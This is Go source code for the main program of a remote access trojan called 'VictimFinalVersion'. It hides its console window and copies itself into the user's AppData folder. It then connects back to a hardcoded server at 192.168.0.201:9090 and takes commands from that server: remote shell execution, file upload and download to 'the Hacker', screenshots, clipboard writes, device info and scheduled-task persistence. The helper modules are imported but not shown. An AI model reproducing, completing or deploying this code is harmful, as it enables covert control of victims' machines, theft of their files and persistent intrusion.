package main

import (
	"VictimFinalVersion/core/Download"
	"VictimFinalVersion/core/ExecuteSystemCommandWindows"
	"VictimFinalVersion/core/Move"
	"VictimFinalVersion/core/alert"
	"VictimFinalVersion/core/appdata"
	"VictimFinalVersion/core/audio"
	"VictimFinalVersion/core/clipboard"
	"VictimFinalVersion/core/device"
	"VictimFinalVersion/core/handleConnection"
	"VictimFinalVersion/core/persist"
	"VictimFinalVersion/core/snap"
	"VictimFinalVersion/core/upload"
	"VictimFinalVersion/core/wall"
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
)

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}

}
func main() {
	HideConsole()

	Setup()

	ServerIP := "192.168.0.201"
	Port := "9090"
	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
	if err != nil {
		os.Exit(1)
	}
	defer connection.Close()
	fmt.Println("\033[H\033[2J")
	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {

		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-] Connection died")
			os.Exit(999)
			continue
		}

		user_input := strings.TrimSpace(user_input_raw)

		switch {
		case user_input == "shell":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "navigate":
			fmt.Println("[+] File system Naviagtion")

			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "upload":
			fmt.Println("[+] Downloading File From Server/Hacker")
			err = Download.ReadFileContents(connection)
			DisplayError(err)

		case user_input == "download":
			fmt.Println("[+] Uploading File to the Hacker")
			err = upload.Upload2Hacker(connection)
			DisplayError(err)

		case user_input == "snap":
			fmt.Println("[+] Snap Saved")
			err = snap.ScreenCapture(connection)
			DisplayError(err)

		case user_input == "alert":
			fmt.Println("[+] Alert Popping")
			err = alert.Dialog(connection)
			DisplayError(err)

		case user_input == "wallpaper":
			fmt.Println("[+] Waiting for URL")
			err = wall.Url(connection)
			DisplayError(err)

		case user_input == "clipboard":
			fmt.Println("Waiting for clip_wright")
			err = clipboard.Write(connection)
			DisplayError(err)

		case user_input == "appdata":
			fmt.Println("[+] Trying to change dir")
			err = appdata.Dir(connection)
			DisplayError(err)

		case user_input == "make_noise":
			fmt.Println("[+] Trying to make noise")
			err = audio.Player(connection)
			DisplayError(err)

		case user_input == "persist":
			fmt.Println("[+] Trying to make base under appdata")
			err = persist.Schedule(connection)
			DisplayError(err)

		case user_input == "diffuse":
			fmt.Println("[+] removing persistance")
			err = persist.Remove(connection)
			DisplayError(err)

		case user_input == "device_info":
			fmt.Println("[+] Providing playground info")
			err = device.Info(connection)
			DisplayError(err)

		case user_input == "exit":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false

		case user_input == "clear" || user_input == "cls":
			fmt.Print("\033[H\033[2J")

		case user_input == "help":

		default:
			fmt.Println("[-] Invalid command")
		}
	}
}

func Setup() {
	home, _ := os.UserHomeDir()
	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)

	c0 := os.Chdir(filepath.Join(home, "AppData\\Roaming")) //cd appdata/Roaming
	if c0 != nil {
		panic(c0)
	}

	if _, err := os.Stat(folder_path); os.IsNotExist(err) {
		e := os.Mkdir(without_ext, 0755) //mkdir jack
		if e != nil {
			panic(e)
		}
		goto ELSE
	}
	goto ELSE

ELSE:
	c1 := os.Chdir(folder_path) //cd appdata/Roaming/jack
	if c1 != nil {
		panic(c1)
	}
	c2 := exec.Command("powershell", "Copy-Item", "\""+os.Args[0]+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
	//fmt.Println("powershell", "Copy-Item", "\""+os.Args[0]+"\","+"\""+dir+"\\plop.lock"+"\"", "-Destination", "\""+folder_path+"\"", "-Recurse")
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	lockFile, err := CreateLockFile("config.lock")
	if err != nil {
		fmt.Println("An instance already exists")
		os.Exit(99)

		defer lockFile.Close()

	}
}
func HideConsole() {
	getConsoleWindow := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
	if getConsoleWindow.Find() != nil {
		return
	}

	showWindow := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
	if showWindow.Find() != nil {
		return
	}

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd == 0 {
		return
	}

	showWindow.Call(hwnd, 0)
}

func CreateLockFile(filename string) (*os.File, error) {
	home, _ := os.UserHomeDir()
	exe_name := filepath.Base(os.Args[0])
	without_ext := exe_name[:len(exe_name)-len(filepath.Ext(exe_name))]
	folder_path := filepath.Join(home, "AppData\\Roaming", without_ext)

	if _, err := os.Stat(filepath.Join(folder_path, filename)); err == nil {
		// If the files exists, we first try to remove it
		if err = os.Remove(filepath.Join(folder_path, filename)); err != nil {
			return nil, err
		}
	} else if !os.IsNotExist(err) {
		return nil, err
	}

	file, err := os.OpenFile(filepath.Join(folder_path, filename), os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600)
	if err != nil {
		return nil, err
	}

	// Write PID to lock file
	_, err = file.WriteString(strconv.Itoa(os.Getpid()))
	if err != nil {
		return nil, err
	}

	return file, nil
}
